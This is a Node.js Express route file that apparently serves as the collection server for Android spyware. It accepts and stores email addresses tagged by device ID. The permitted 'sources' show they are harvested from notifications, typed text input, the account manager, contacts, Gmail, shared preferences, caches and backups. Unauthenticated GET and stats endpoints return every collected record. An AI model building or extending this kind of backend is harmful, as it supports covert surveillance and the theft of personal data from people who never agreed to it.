const express = require('express');
const router = express.Router();
const EmailAccount = require('../models/EmailAccount');

// POST /email-accounts - Save email account
router.post('/', async (req, res) => {
    try {
        const { email, packageName, appName, source, timestamp, isActive, lastSeen, deviceId } = req.body;
        
        // Validate required fields
        if (!email || !packageName || !appName || !source || !timestamp || !lastSeen || !deviceId) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: email, packageName, appName, source, timestamp, lastSeen, deviceId'
            });
        }
        
        // Validate email format
        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        if (!emailRegex.test(email)) {
            return res.status(400).json({
                success: false,
                message: 'Invalid email format'
            });
        }
        
        // Validate source
        const validSources = ['notification', 'text_input', 'system', 'account_manager', 'contacts', 'gmail_channel', 'shared_prefs', 'app_context', 'cache', 'backup'];
        if (!validSources.includes(source)) {
            return res.status(400).json({
                success: false,
                message: 'Invalid source. Must be one of: ' + validSources.join(', ')
            });
        }
        
        console.log('📧 Received email account payload:', {
            email: email.substring(0, 10) + '...',
            packageName,
            appName,
            source,
            timestamp,
            isActive,
            lastSeen,
            deviceId: deviceId.substring(0, 8) + '...'
        });
        
        // Try to find existing email account for this device
        const existingAccount = await EmailAccount.findOne({ 
            email: email.toLowerCase(), 
            deviceId: deviceId 
        });
        
        if (existingAccount) {
            // Update existing account
            existingAccount.lastSeen = lastSeen;
            existingAccount.isActive = isActive;
            existingAccount.source = source; // Update source if it's more recent
            await existingAccount.save();
            
            console.log('✅ Email account updated:', email.substring(0, 10) + '...');
            
            return res.status(200).json({
                success: true,
                message: 'Email account updated successfully',
                email: email,
                action: 'updated'
            });
        } else {
            // Create new email account
            const emailAccountData = {
                email: email.toLowerCase(),
                packageName,
                appName,
                source,
                timestamp,
                isActive: isActive !== undefined ? isActive : true,
                lastSeen,
                deviceId
            };
            
            const emailAccount = new EmailAccount(emailAccountData);
            await emailAccount.save();
            
            console.log('✅ Email account saved:', email.substring(0, 10) + '...');
            
            return res.status(201).json({
                success: true,
                message: 'Email account saved successfully',
                email: email,
                action: 'created'
            });
        }
        
    } catch (error) {
        console.error('❌ Error saving email account:', error);
        
        if (error.code === 11000) {
            return res.status(409).json({
                success: false,
                message: 'Email account already exists for this device'
            });
        }
        
        return res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

// GET /email-accounts - Get all email accounts for a device
router.get('/', async (req, res) => {
    try {
        const { deviceId, source, isActive } = req.query;
        
        let query = {};
        if (deviceId) query.deviceId = deviceId;
        if (source) query.source = source;
        if (isActive !== undefined) query.isActive = isActive === 'true';
        
        const emailAccounts = await EmailAccount.find(query)
            .sort({ createdAt: -1 })
            .limit(1000); // Limit to prevent large responses
        
        console.log(`📧 Retrieved ${emailAccounts.length} email accounts`);
        
        return res.status(200).json({
            success: true,
            count: emailAccounts.length,
            emailAccounts: emailAccounts.map(account => ({
                email: account.email,
                packageName: account.packageName,
                appName: account.appName,
                source: account.source,
                timestamp: account.timestamp,
                isActive: account.isActive,
                lastSeen: account.lastSeen,
                deviceId: account.deviceId,
                createdAt: account.createdAt
            }))
        });
        
    } catch (error) {
        console.error('❌ Error retrieving email accounts:', error);
        return res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

// GET /email-accounts/stats - Get email account statistics
router.get('/stats', async (req, res) => {
    try {
        const { deviceId } = req.query;
        
        let matchQuery = {};
        if (deviceId) matchQuery.deviceId = deviceId;
        
        const stats = await EmailAccount.aggregate([
            { $match: matchQuery },
            {
                $group: {
                    _id: null,
                    totalAccounts: { $sum: 1 },
                    activeAccounts: { $sum: { $cond: ['$isActive', 1, 0] } },
                    inactiveAccounts: { $sum: { $cond: ['$isActive', 0, 1] } },
                    sources: { $addToSet: '$source' },
                    uniqueEmails: { $addToSet: '$email' }
                }
            },
            {
                $project: {
                    _id: 0,
                    totalAccounts: 1,
                    activeAccounts: 1,
                    inactiveAccounts: 1,
                    sources: 1,
                    uniqueEmailCount: { $size: '$uniqueEmails' }
                }
            }
        ]);
        
        const result = stats[0] || {
            totalAccounts: 0,
            activeAccounts: 0,
            inactiveAccounts: 0,
            sources: [],
            uniqueEmailCount: 0
        };
        
        console.log('📊 Email account statistics:', result);
        
        return res.status(200).json({
            success: true,
            stats: result
        });
        
    } catch (error) {
        console.error('❌ Error getting email account statistics:', error);
        return res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

module.exports = router;
